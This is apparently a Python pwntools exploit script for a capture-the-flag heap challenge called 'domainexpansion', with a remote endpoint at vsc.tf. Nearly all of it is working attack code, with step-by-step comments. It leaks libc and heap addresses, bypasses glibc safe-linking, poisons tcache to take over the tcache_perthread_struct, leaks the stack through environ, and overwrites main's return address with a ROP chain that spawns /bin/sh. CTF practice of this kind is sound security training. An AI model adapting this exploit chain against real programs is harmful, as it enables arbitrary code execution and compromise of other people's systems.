from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep

context.arch = "amd64"
context.word_size = 64

file = "./domainexpansion_patched"
args = []
io: process = None

speed = 0#0.05

def debug():
    gdb.attach(io, gdbscript=
    """

    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote(host="vsc.tf", port=7001)

def launch_local():
    global file, io
    io = process([file, *args])
    # debug()

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)

def launch():
    l = launch_local
    # l = launch_remote
    l()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1: a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1: b_ = 0
    return d[a_+len(a):b_]

#
# exploit goes here
#

exe = ELF(file)
libc = ELF("./libc.so.6")

def exploit():
    def alloc(index, size):
        sla(b"Enter your choice: ", b"1")
        sla(b"Enter an index: ", str(index).encode())
        sla(b"Enter a size: ", str(size).encode())
    def edit(index, data):
        sla(b"Enter your choice: ", b"2")
        sla(b"Enter an index: ", str(index).encode())
        sla(b"Enter data: ", data)
    def show(index):
        sla(b"Enter your choice: ", b"3")
        sla(b"Enter an index: ", str(index).encode())
        leak = recvu(b"\n---- Menu ----")
        return getb(leak, b"Data: ", b"\n---- Menu ----")
    def free(index):
        sla(b"Enter your choice: ", b"4")
        sla(b"Enter an index: ", str(index).encode())
    def domain_expansion(index, size):
        sla(b"Enter your choice: ", b"260")
        sla(b"Enter an index: ", str(index).encode())
        sla(b"Expanded size: ", str(size).encode())

    # some heap fengshui

    alloc(2, 1) # this will get expanded
    alloc(3, 0x78) # this will get overwritten

    alloc(4, 0x78) # just here to increment tcache linked list size 0x80 (ignore it)
    alloc(5, 1) # same but linked list size 0x20

    free(4)
    free(5)
    alloc(0, 0x800) # big chunk that will go in unsorted
    alloc(1, 0x80) # barrier (anti merge)

    free(0)
    alloc(0, 0x800)
    leak = show(0) # they don't initialize chunks so the allocated chunk still contains the fd and bk pointer (libc's arena leak)
    libc.address = u64(leak) - 0x21ace0
    info("libc: %#018x" % libc.address)
    

    
    domain_expansion(2, 0x41) # modify its size with 0x40, it was 0x20 so it now overlaps with the next chunk (chunk 3)
    free(2)
    free(3) 

    alloc(2, 0x38) # not initialized -> leak tcache fd pointer
    heap_base = u64(show(2)) << 12 # tcache fd pointer are mangled (Safe linking libc 2.32 https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c#L331) 

    info("heap: %#018x" % heap_base)

    payload = flat([ # will overwrite the next chunk
        b"A"*0x18,
        0x21, # next chunk's size
        (heap_base >> 12) ^ (heap_base + 0x90), # next chunk's fd (safe linking) now points to the tcache perthread struct
    ])

    edit(2, payload)

    alloc(6, 0x78) # update the tcache perthread 0x80 entry
    alloc(7, 0x78) # this chunk hijack the tcache perthread struct

    payload = flat([
        heap_base + 0x10 
    ])
    edit(7, payload) # modify tcache perthread struct's entry 0x20 with address heap_base + 0x10

    # heap_base + 0x10 contains the size of the linked list, we need to modify it too so malloc doesn't skip the tcache part (if linked list size = 0 it will just skip)
    alloc(8, 0x10) # alloc a 0x20 sized chunk -> can modify heap_base + 0x10
    edit(8, p16(0xffff) + p16(0xffff)) # 0x20 & 0x30 size = 0xffff

    payload = flat([
        libc.sym["environ"] # now modify tcache perthread struct's entry 0x20 with address "environ"
    ])
    edit(7, payload)
    alloc(9, 8) # alloc a 0x20 sized chunk -> can leak environ (=stack leak)
    stack = u64(show(9)) - 0x128 # leak it
    info("stack: %#018x" % stack)

    payload = flat([
        0, # entry 0x20
        stack, # entry 0x30
    ])
    edit(7, payload)
    alloc(10, 0x20) # need a bigger entry for our rop chain
    pop_rdi = libc.address + 0x2a3e5
    edit(10, flat([ # use the stack leak to replace main's return address with a ropchain
        0,
        pop_rdi,
        next(libc.search(b"/bin/sh\0")),
        libc.sym["do_system"]+2, # stack alignement problem (xmm regs crash)
    ]))

    sla(b"Enter your choice: ", b"5") # exit and get shell

    io.interactive()
    input("end")
    exit()

launch()
exploit()